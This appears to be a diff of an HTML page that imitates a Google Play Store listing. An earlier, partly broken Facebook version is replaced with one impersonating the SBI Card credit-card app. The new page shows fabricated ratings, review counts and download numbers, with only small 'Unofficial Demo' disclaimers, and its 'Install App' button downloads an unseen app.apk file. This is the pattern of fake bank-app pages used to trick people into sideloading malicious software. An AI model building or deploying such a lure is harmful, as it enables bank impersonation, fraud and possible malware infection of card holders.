@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="hi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook</title>
+<title>SBI Card - Unofficial Demo</title>
 
 <style>
 *{
@@ -14,224 +13,415 @@
 body{
   margin:0;
   font-family:Arial,sans-serif;
-  background:white;
+  background:#fff;
   color:#202124;
 }
 
+.page{
+  width:100%;
+  max-width:650px;
+  margin:auto;
+}
+
+/* TOP APP AREA */
 .header{
   display:flex;
   align-items:center;
-  padding:20px;
   gap:20px;
+  padding:35px 25px 20px;
 }
 
-.icon{
-  width:100px;
-  height:100px;
-  background:#1877f2;
-  border-radius:22px;
-  color:white;
-  font-size:85px;
-  font-weight:bold;
+.app-icon{
+  width:110px;
+  height:110px;
+  border-radius:25px;
+  background:#fff;
+  box-shadow:0 3px 12px #ccc;
   display:flex;
-  justify-content:center;
   align-items:center;
+  justify-content:center;
+  overflow:hidden;
+}
+
+.app-icon-text{
+  font-size:28px;
+  font-weight:bold;
+  color:#0758b8;
+}
+
+.app-icon-text span{
+  color:#16a9df;
+}
+
+.title{
+  flex:1;
 }
 
 .title h1{
-  margin:0 0 8px;
+  margin:0 0 10px;
   font-size:30px;
   font-weight:500;
+  line-height:1.2;
 }
 
 .title p{
-  margin:5px 0;
-  color:#2874c6;
+  margin:6px 0;
   font-size:17px;
+  color:#075fc0;
+  line-height:1.35;
 }
 
-.info{
-  color:#666 !important;
+.downloads{
+  color:#222 !important;
 }
 
-.buttons{
+/* INFO */
+.info-row{
   display:flex;
-  gap:15px;
-  padding:10px 20px 25px;
+  justify-content:space-around;
+  text-align:center;
+  padding:20px 10px;
 }
 
-button{
+.info-item{
   flex:1;
-  height:55px;
-  border-radius:30px;
-  font-size:18px;
+  border-right:1px solid #ddd;
+}
+
+.info-item:last-child{
+  border-right:0;
+}
+
+.big{
+  font-size:38px;
   font-weight:bold;
 }
-<div class="install-area">
-  <a href="app.apk" download="app.apk" class="install-btn">
-    Install
-  </a>
-</div>
 
-}
-
-.box{
-  margin:20px;
-  padding:20px;
-  background:#f1f5f9;
-  border-radius:25px;
-}
-
-.box h2{
-  margin-top:0;
-  font-size:21px;
-}
-
-.question{
-  background:white;
-  padding:18px;
-  border-radius:25px;
-  margin-top:15px;
+.small{
+  margin-top:8px;
+  font-size:16px;
   color:#555;
 }
 
-.suggestion{
-  background:#c7e7ff;
-  color:#075b8e;
-  padding:16px;
-  border-radius:25px;
-  margin-top:15px;
+.star{
+  color:#1769d1;
 }
 
-.rating{
-  padding:10px 20px 120px;
-}
-
-.stars{
-  font-size:45px;
-  letter-spacing:5px;
+/* UNOFFICIAL DEMO */
+.demo{
+  margin:15px 20px;
+  padding:10px;
+  text-align:center;
+  font-size:14px;
   color:#777;
 }
 
-.bottom{
-  position:fixed;
-  bottom:0;
-  left:0;
-  right:0;
-  height:75px;
-  background:#f5f7fa;
-  border-top:1px solid #ddd;
-  display:flex;
-  justify-content:space-around;
-  align-items:center;
-}
-
-.nav{
+/* INSTALL BUTTON */
+.install-area{
+  padding:15px 20px 30px;
   text-align:center;
-  font-size:13px;
-  color:#555;
 }
 
-.nav span{
+.install-btn{
   display:block;
-  font-size:27px;
-  margin-bottom:3px;
+  width:100%;
+  padding:17px;
+  border-radius:30px;
+  background:#1769d1;
+  color:white;
+  text-decoration:none;
+  font-size:20px;
+  font-weight:bold;
+  box-shadow:0 4px 10px rgba(0,0,0,.18);
 }
 
-.active{
-  color:#1769c2;
+.install-btn:active{
+  transform:scale(.97);
+}
+
+/* RATINGS */
+.reviews{
+  border-top:1px solid #ddd;
+  padding:25px 20px;
+}
+
+.reviews h2{
+  margin:0 0 25px;
+  font-size:25px;
+  font-weight:500;
+}
+
+.rating-number{
+  font-size:65px;
+  margin-bottom:5px;
+}
+
+.review-count{
+  color:#555;
+  font-size:17px;
+}
+
+.stars{
+  color:#1769d1;
+  font-size:25px;
+  letter-spacing:2px;
+}
+
+.bars{
+  margin-top:25px;
+}
+
+.bar-row{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin:10px 0;
+}
+
+.bar{
+  flex:1;
+  height:14px;
+  background:#dce3eb;
+  border-radius:20px;
+  overflow:hidden;
+}
+
+.fill{
+  height:100%;
+  background:#1769d1;
+  border-radius:20px;
+}
+
+.five{width:78%;}
+.four{width:15%;}
+.three{width:5%;}
+.two{width:5%;}
+.one{width:5%;}
+
+/* REVIEW CARD */
+.review-card{
+  margin-top:30px;
+  padding-top:25px;
+  border-top:1px solid #ddd;
+}
+
+.user{
+  display:flex;
+  align-items:center;
+  gap:15px;
+}
+
+.avatar{
+  width:55px;
+  height:55px;
+  border-radius:50%;
+  background:#ddd;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:25px;
+}
+
+.username{
+  font-size:18px;
+  font-weight:bold;
+}
+
+.date{
+  color:#777;
+  font-size:14px;
+  margin-top:5px;
+}
+
+.review-stars{
+  color:#1769d1;
+  font-size:23px;
+  margin-top:20px;
+}
+
+.review-text{
+  font-size:17px;
+  line-height:1.6;
+  color:#444;
+  margin-top:15px;
+}
+
+/* FOOTER */
+.footer{
+  text-align:center;
+  padding:30px 20px;
+  color:#777;
+  font-size:13px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="header">
+<div class="page">
 
-  <div class="icon">f</div>
+  <!-- APP HEADER -->
 
-  <div class="title">
-    <h1>Facebook</h1>
-    <p>Meta Platforms, Inc.</p>
-    <p class="info">Contains ads • In-app purchases</p>
+  <div class="header">
+
+    <div class="app-icon">
+      <div class="app-icon-text">
+        SBI <span>Card</span>
+      </div>
+    </div>
+
+    <div class="title">
+      <h1>SBI Card: Manage<br>Credit Card</h1>
+
+      <p>
+        SBI Cards and Payment Services<br>
+        Limited
+      </p>
+
+      <p class="downloads">
+        Unofficial Demo
+      </p>
+    </div>
+
   </div>
 
-</div
-.install-area{
-  display:flex;
-  justify-content:center;
-  margin:30px 20px;
-}
 
-.install-btn{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  width:80%;
-  max-width:350px;
-  height:60px;
-  background:#1769d1;
-  color:white;
-  text-decoration:none;
-  border-radius:30px;
-  font-size:21px;
-  font-weight:bold;
-  box-shadow:0 3px 8px rgba(0,0,0,.15);
-}
+  <!-- APP INFORMATION -->
 
-  <h2>✨ Ask Play about this app <small>New!</small></h2>
+  <div class="info-row">
 
-  <div class="question">
-    Ask a question about this app
+    <div class="info-item">
+      <div class="big star">4.6 ★</div>
+      <div class="small">1m reviews</div>
+    </div>
+
+    <div class="info-item">
+      <div class="big">3+</div>
+      <div class="small">Rated for 3+</div>
+    </div>
+
+    <div class="info-item">
+      <div class="big">10m+</div>
+      <div class="small">Downloads</div>
+    </div>
+
   </div>
 
-  <div class="suggestion">
-    What is the main screen I will see when I open the app?
+
+  <!-- INSTALL -->
+
+  <div class="demo">
+    Unofficial Demo • Test Application
   </div>
 
-  <div class="suggestion">
-    How can I control my privacy and who sees my posts?
+  <div class="install-area">
+
+    <a href="app.apk"
+       class="install-btn"
+       download>
+       Install App
+    </a>
+
   </div>
 
-</div>
 
-<div class="rating">
+  <!-- RATINGS AND REVIEWS -->
 
-  <h2>Rate this app</h2>
+  <div class="reviews">
 
-  <p>Tell others what you think</p>
+    <h2>Ratings and reviews</h2>
 
-  <div class="stars">
-    ☆ ☆ ☆ ☆ ☆
+    <div class="rating-number">
+      4.6
+    </div>
+
+    <div class="stars">
+      ★ ★ ★ ★ ★
+    </div>
+
+    <div class="review-count">
+      1,539,142 reviews
+    </div>
+
+
+    <div class="bars">
+
+      <div class="bar-row">
+        <span>5</span>
+        <div class="bar">
+          <div class="fill five"></div>
+        </div>
+      </div>
+
+      <div class="bar-row">
+        <span>4</span>
+        <div class="bar">
+          <div class="fill four"></div>
+        </div>
+      </div>
+
+      <div class="bar-row">
+        <span>3</span>
+        <div class="bar">
+          <div class="fill three"></div>
+        </div>
+      </div>
+
+      <div class="bar-row">
+        <span>2</span>
+        <div class="bar">
+          <div class="fill two"></div>
+        </div>
+      </div>
+
+      <div class="bar-row">
+        <span>1</span>
+        <div class="bar">
+          <div class="fill one"></div>
+        </div>
+      </div>
+
+    </div>
+
+
+    <!-- REVIEW -->
+
+    <div class="review-card">
+
+      <div class="user">
+
+        <div class="avatar">
+          👤
+        </div>
+
+        <div>
+          <div class="username">
+            User Review
+          </div>
+
+          <div class="date">
+            16/07/2026
+          </div>
+        </div>
+
+      </div>
+
+      <div class="review-stars">
+        ★ ★ ★ ★ ★
+      </div>
+
+      <div class="review-text">
+        This is an unofficial demonstration page.
+        This content is only for testing the HTML design.
+      </div>
+
+    </div>
+
   </div>
 
-</div>
 
-<div class="bottom">
-
-  <div class="nav">
-    <span>🎮</span>
-    Games
-  </div>
-
-  <div class="nav active">
-    <span>▦</span>
-    Apps
-  </div>
-
-  <div class="nav">
-    <span>⌕</span>
-    Search
-  </div>
-
-  <div class="nav">
-    <span>▣</span>
-    Books
-  </div>
-
-  <div class="nav">
-    <span>♙</span>
-    You
+  <div class="footer">
+    Unofficial Demo • Not affiliated with SBI Cards
   </div>
 
 </div>
